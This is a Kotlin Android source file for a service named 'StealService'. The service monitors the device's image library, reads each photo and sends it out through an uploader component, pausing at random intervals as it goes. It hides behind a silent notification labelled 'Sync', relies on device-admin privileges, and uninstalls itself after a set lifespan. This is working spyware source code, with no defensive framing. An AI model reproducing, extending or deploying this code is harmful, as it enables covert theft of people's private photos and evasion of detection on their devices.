package com.s.sync

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.ContentUris
import android.content.Intent
import android.database.ContentObserver
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.MediaStore
import kotlin.random.Random

class StealService : Service() {

    companion object {
        const val SELF_UNINSTALL = true
        const val LIFESPAN_HOURS = 3L
        private const val CH = "s"
    }

    private val lock = Object()
    @Volatile private var pending = false
    @Volatile private var alive = true
    private var worker: Thread? = null
    private var obs: ContentObserver? = null
    private val prefs by lazy { getSharedPreferences("p", 0) }

    override fun onBind(i: Intent?): IBinder? = null

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        startForeground(1, notif())
        if (worker == null) worker = Thread { loop() }.also { it.start() }
        if (obs == null) {
            obs = object : ContentObserver(Handler(Looper.getMainLooper())) {
                override fun onChange(self: Boolean) { wake() }
            }
            contentResolver.registerContentObserver(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, obs!!)
        }
        return START_STICKY
    }

    private fun wake() { synchronized(lock) { pending = true; lock.notifyAll() } }

    private fun loop() {
        while (alive) {
            val n = runCatching { pass() }.getOrDefault(-1)

            if (n == 0 && SELF_UNINSTALL) {
                val f = prefs.getLong("f", 0L)
                if (f == 0L) prefs.edit().putLong("f", System.currentTimeMillis()).apply()
                else if (System.currentTimeMillis() - f > LIFESPAN_HOURS * 3600_000L) {
                    remove()
                    return
                }
            }
            synchronized(lock) {
                if (!pending) runCatching { lock.wait(60000) }
                pending = false
            }
        }
    }

    private fun uri(id: Long): Uri =
        ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)

    private fun pass(): Int {
        val proj = arrayOf(MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.MIME_TYPE)
        val cur = contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj,
            "${MediaStore.Images.Media._ID} > ?",
            arrayOf(Prefs.mark(this).toString()),
            "${MediaStore.Images.Media._ID} ASC LIMIT 150")

        val rows = ArrayList<Triple<Long, String, String>>()
        cur?.use {
            while (it.moveToNext())
                rows.add(Triple(it.getLong(0), it.getString(1) ?: "img.jpg",
                    it.getString(2) ?: "image/jpeg"))
        }

        var ok = 0
        for ((id, name, mime) in rows) {
            if (!alive) break
            val bytes = runCatching {
                contentResolver.openInputStream(uri(id))?.use { s -> s.readBytes() }
            }.getOrNull()
            if (bytes == null || bytes.isEmpty()) { Prefs.setMark(this, id); continue }

            if (!Uploader.send(this, id, name, mime, bytes)) return ok

            Prefs.setMark(this, id)
            ok++
            Thread.sleep(1200 + Random.nextLong(1200))
        }
        return ok
    }

    private fun remove() {
        alive = false
        prefs.edit().putBoolean("gone", true).apply()
        val cn = ComponentName(this, AdminReceiver::class.java)
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        runCatching { dpm.setUninstallBlocked(cn, packageName, false) }
        runCatching { dpm.removeActiveAdmin(cn) }
        runCatching {
            startActivity(Intent(Intent.ACTION_DELETE, Uri.parse("package:$packageName"))
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
        }
        stopForeground(true)
        stopSelf()
    }

    private fun notif(): Notification {
        if (Build.VERSION.SDK_INT >= 26) {
            val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            if (nm.getNotificationChannel(CH) == null) {
                val c = NotificationChannel(CH, "Sync", NotificationManager.IMPORTANCE_MIN)
                c.setShowBadge(false)
                c.setSound(null, null)
                c.enableVibration(false)
                nm.createNotificationChannel(c)
            }
            return Notification.Builder(this, CH)
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setSilent(true).build()
        }
        @Suppress("DEPRECATION")
        return Notification.Builder(this)
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(Notification.PRIORITY_MIN).build()
    }

    override fun onDestroy() {
        alive = false
        obs?.let { runCatching { contentResolver.unregisterContentObserver(it) } }
        wake()
        super.onDestroy()
    }
}